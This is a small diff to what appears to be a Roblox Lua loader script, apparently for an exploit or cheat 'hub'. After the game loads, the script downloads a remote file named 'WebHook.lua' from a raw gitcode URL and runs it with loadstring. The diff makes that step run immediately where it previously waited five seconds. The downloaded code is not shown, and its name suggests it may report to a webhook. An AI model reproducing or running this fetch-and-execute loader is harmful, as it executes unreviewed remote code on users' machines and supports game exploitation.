@@ -1,6 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 
-task.delay(5, function()
+task.spawn(function()
     loadstring(game:HttpGet("https://raw.gitcode.com/XiaoYunUwU/XA/raw/main/WebHook.lua"))("XAHub")
 end)
 
